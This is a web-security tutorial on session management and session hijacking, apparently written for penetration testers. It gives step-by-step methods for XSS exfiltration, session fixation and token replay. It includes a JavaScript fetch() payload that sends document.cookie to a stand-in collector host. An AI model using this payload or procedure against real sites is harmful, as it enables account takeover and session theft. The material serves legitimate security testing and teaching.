# Session Management
Session management is how a web application tracks and enforces a user's identity, authentication state, and authorization across multiple requests. Because HTTP is stateless, sessions (IDs or tokens) bridge requests so the server knows who is making each request. Weak session handling lets attackers impersonate users, escalate privileges, or persist access.

---

## Core concepts :
- **Session creation:** Server issues a session identifier or token after authentication. This value represents the authenticated user for future requests.  
- **Session tracking:** The token is sent with each request (cookies, Authorization header, hidden fields). The server uses it to identify and authorize actions.  
- **Session expiry:** Sessions must expire or be invalidated after inactivity or on sensitive events.  
- **Session termination:** Logging out or password changes should immediately revoke the session server-side.  
- **Token storage models:**  
  - **Cookie-based:** Browser sends Set-Cookie automatically; attributes matter (Secure, HttpOnly, SameSite, Expires).  
  - **Token-based (JWT):** Tokens stored client-side (often localStorage) and sent in headers; these require explicit handling for revocation/rotation and are vulnerable to XSS if stored insecurely.

---

## Where session problems appear ?
- Authentication flows: login, logout, password reset, SSO/redirects.  
- API endpoints that accept tokens or IDs in params or headers.  
- Client storage: cookies, localStorage, sessionStorage.  
- Admin/back-office panels, export templates, email rendering (often weaker sanitization).  
- Session lifecycle handlers: rotation on login, revocation on logout/password change.

---

## Common session vulnerabilities :
- Predictable or weak session IDs (easy guessing).  
- Session fixation (session not rotated after login).  
- Insecure storage (tokens in localStorage or accessible cookies).  
- Missing HttpOnly/Secure/SameSite cookie attributes.  
- Long-lived tokens with no revocation mechanism (e.g., stateless JWTs without blocklist).  
- Token leakage via redirects, referrers, logs, or third-party integrations.  
- Insufficient logging tied to session identifiers.

---

## Session hijacking — 
Session hijacking is the act of stealing or otherwise obtaining a valid session identifier/token and using it to impersonate the legitimate user. Impact ranges from account takeover to full administrative control depending on the stolen session's privileges.

Primary vectors:
- Client-side XSS that reads cookies or tokens.  
- Network interception (MITM) when HTTPS is absent or misconfigured.  
- Token leakage through referrer headers, logs, or third-party redirects.  
- Insecure client storage (localStorage, shared devices).  
- Session fixation where attacker sets a session and waits for victim to authenticate.

---

## Session hijacking — steps : 

### 1 — Recon: locate session material
- Identify where session identifiers live: cookies (`Set-Cookie`), Authorization headers (`Bearer <token>`), hidden fields, or URL parameters.  
- Use browser dev tools and proxy (Burp) to capture authentication flow and storage behavior.

### 2 — Choose an attack vector (examples)
- **XSS-based exfiltration (common & reliable where XSS exists):** plan to execute script that reads document.cookie or localStorage token.  
- **Network interception (rare with HTTPS but possible on misconfigured targets):** position as MITM or exploit mixed-content endpoints.  
- **Referrer/redirect leakage:** find flows that forward user-controlled inputs to third parties or include tokens in query strings.  
- **Session fixation:** find endpoints that accept a session ID from the attacker and let the victim authenticate into it.

### 3 — Execute attack (examples)

Reflected/stored XSS exfiltration (controlled proof):
- Plant a benign XSS payload that beacon‑backs the cookie/token to your collector:  
  ```js
  fetch("https://collector.example/collect?c="+encodeURIComponent(document.cookie));
  ```
- Seed the payload in a stored field (comment, profile) or reflect it via a crafted URL.  
- Wait for privileged user/admin or victim to load the page; check collector for incoming data and metadata (user-agent, referrer).

Session fixation:
- Obtain a valid session ID from the target (create a session via the app).  
- Convince victim to use your session (link containing session token where the app accepts session identifier via cookie or parameter).  
- After victim logs in, use that session ID to access victim’s account.

Token replay (if token can be used directly):
- Capture token (via any leak) and replay requests to sensitive endpoints using the stolen token in the same header/cookie format observed.

MITM / network capture:
- Intercept traffic between client and server to read session tokens if TLS is not enforced or mixed content exists.

### 4 — Post‑capture actions (safe, proof‑focused) : 
- Confirm access by requesting a non-destructive resource (profile page) using the stolen token/session.  
- Capture request/response headers showing the session used and the resulting authenticated response.  
- Record collector evidence with timestamps, user agent, and referrer to map where execution occurred.

---

## Detection and validation (confirming hijack, avoiding false positives) : 
- Use two separate accounts/sessions to ensure access is not due to a logic bug (e.g., public data).  
- Confirm the stolen token/session grants the same privileges as the victim (view-only checks first).  
- Correlate evidence: collector logs showing victim UA/referrer, server logs showing session activity, and live authenticated responses.  
- Avoid destructive actions; document exactly which endpoints were accessible and which operations succeeded.

---

## Quick testing for session hijacking :
- Locate session tokens in requests/responses.  
- Check cookie attributes: Secure, HttpOnly, SameSite.  
- Test for XSS vectors that can expose tokens.  
- Inspect redirects/referrers for token leakage.  
- Test session rotation after login (session fixation).  
- Try replaying captured tokens on sensitive endpoints (read-only first).  
- Review server logs for session usage and suspect activity.

---

